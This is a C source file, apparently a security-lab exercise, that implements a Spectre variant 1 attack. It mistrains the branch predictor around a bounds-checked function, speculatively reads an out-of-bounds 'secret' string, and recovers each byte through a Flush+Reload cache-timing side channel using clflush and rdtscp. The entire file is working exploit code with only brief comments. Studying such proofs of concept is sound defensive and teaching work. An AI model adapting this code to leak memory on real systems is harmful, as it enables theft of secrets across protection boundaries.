#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9};
uint8_t temp = 0;
char *secret = "A Top Secret";
uint8_t array[256 * 4096];
static int scores[256];

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
    if (x < buffer_size)
    {
        return buffer[x];
    }
    else
    {
        return 0;
    }
}

void flushSideChannel()
{
    // Write to array to bring it to RAM to prevent Copy-on-write
    int i;
    for (i = 0; i < 256; i++)
    {
        array[i * 4096 + DELTA] = 1;
    }

    // Flush the values of the array from cache
    for (i = 0; i < 256; i++)
    {
        _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannelImproved()
{
    volatile uint8_t *addr;
    register uint64_t time1, time2;
    int junk = 0;

    int i;
    for (i = 0; i < 256; i++)
    {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;

        if (time2 <= CACHE_HIT_THRESHOLD)
        {
            scores[i]++; /* if cache hit, add 1 for this value */
        }
    }
}

void spectreAttack(size_t larger_x)
{
    uint8_t s;

    int i;
    for (i = 0; i < 256; i++)
    {
        _mm_clflush(&array[i * 4096 + DELTA]);
    }

    // Train the CPU to take the true branch inside victim().
    for (i = 0; i < 10; i++)
    {
        _mm_clflush(&buffer_size);
        restrictedAccess(i);
    }

    // Flush buffer_size and array[] from the cache.
    _mm_clflush(&buffer_size);
    for (i = 0; i < 256; i++)
    {
        _mm_clflush(&array[i * 4096 + DELTA]);
    }

    // for (i = 0; i < 100; i++)
    // {
    // }

    // Ask victim() to return the secret in out-of-order execution.
    s = restrictedAccess(larger_x);
    array[s * 4096 + DELTA] += 88;
}

int main()
{
    uint8_t s;
    size_t larger_x = (size_t)(secret - (char *)buffer);
    flushSideChannel();

    int i;
    for (i = 0; i < 256; i++)
    {
        scores[i] = 0;
    }
    for (i = 0; i < 1000; i++)
    {
        spectreAttack(larger_x);
        reloadSideChannelImproved();
    }

    int max = 1;
    for (i = 1; i < 256; i++)
    {
        if (scores[max] < scores[i])
        {
            max = i;
        }
    }

    printf("Reading secret value at %p\n", (void *)larger_x);
    printf("The secret value is %d\n", max);
    printf("The number of hits is %d\n", scores[max]);
    return (0);
}
